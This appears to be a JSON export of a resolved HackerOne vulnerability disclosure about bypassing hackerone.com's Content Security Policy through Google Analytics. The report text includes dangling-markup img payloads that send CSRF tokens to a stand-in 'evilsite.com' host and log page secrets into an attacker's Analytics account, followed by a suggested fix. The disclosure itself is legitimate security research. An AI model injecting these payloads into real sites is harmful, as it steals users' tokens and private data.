{
  "id": 199779,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTk3Nzk=",
  "url": "https://hackerone.com/reports/199779",
  "title": "Google Analytics could be used as CSP bypass for data exfiltration on hackerone.com",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2017-01-19T23:35:16.499Z",
  "submitted_at": "2017-01-19T23:35:16.499Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "aaron_costello",
    "url": "/aaron_costello",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/89cpgLpC5JjJB9H6NtWYW3wJ/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 13,
    "url": "https://hackerone.com/security",
    "handle": "security",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "HackerOne",
      "twitter_handle": "Hacker0x01",
      "website": "https://hackerone.com",
      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2017-03-26T08:17:54.922Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2017-02-24T08:17:43.415Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Greetings, I believe I may have found a way to bypass CSP on hackerone.com\n\nThe issue lies here:\n\n```\nimg-src 'self' data: www.google-analytics.com\n```\n\nAs you can imagine, how can image tags be used maliciously here to this safe site? Well, as you know, on google-analytics.com we have the ability to host user content.\n\nBefore we get into that, lets look at how image tags are processed.\nConsider the following injected content:\n```\n<img src='https://evilsite.com/steal_csrf_token?html=\n```\nA tag with an unclosed quote will capture all output up to the next matching quote. This could include security sensitive content on pages in the following way,:\n```\n<img src='https://evilsite.com/steal_csrf_token?html=\n<form action=\"https://coinbase.com/poc\">\n\n<input type=\"hidden\" name=\"csrf_token\" value=\"some_csrf_token_value\">\n</form>\n```\nThe resulting image element will send a request to https://evilsite.com/steal_csrf_token?html=/log_csrf?html=...some_csrf_token_value....\n\nAs a result, an attacker can leverage this dangling markup attack to exfiltrate CSRF tokens to a site of their choosing.\n\nThe issue\n----------\n\nFirst take a look at Google Analytics. Imagine a content injection that looks something like:\n```\n< injection point >\n<p>secret</p>\n```\nThe Google Analytics’ ea parameter is used to log event actions and can contain arbitrary strings. An attacker could setup a Google Analytics account and then inject an image referencing their account:\n```\n<img src='https://www.google-analytics.com/collect?v=1&tid=UA-55300588-1&cid=3121525717&t=event&ec=email&el=2111515817&cs=newsletter&cm=email&cn=062413&cm1=1&ea=\n<p>secret</p>\n```\nThis results in the following request, logging “secret” to their account:\n```\nhttps://www.google-analytics.com/collect?v=1&tid=UA-77300477-1&cid=2111515817&t=event&ec=email&el=2111515817&cs=newsletter&cm=email&cn=062413&cm1=1&ea=%3Cp%3Esecret%3C/p%3E\n```\n\nThe solution\n-------------\n\nSwap from using their image based system to an XHR based approach (https://developers.google.com/analytics/devguides/collection/analyticsjs/sending-hits#specifying_different_transport_mechanisms)\n\n\n\n",
  "weakness": {
    "id": 57,
    "name": "Violation of Secure Design Principles"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2017-03-26T08:17:43.444Z",
  "allow_singular_disclosure_after": -217311333.18146703,
  "singular_disclosure_allowed": true,
  "vote_count": 44,
  "voters": [
    "nopurposeinlife",
    "delimitry",
    "testt0",
    "sp1d3rs",
    "icanthack",
    "ngalog",
    "bugdiscloseguys",
    "its_afolic",
    "samet",
    "unkn7wn",
    "and 34 more..."
  ],
  "severity": {
    "rating": "low",
    "score": 3.7,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
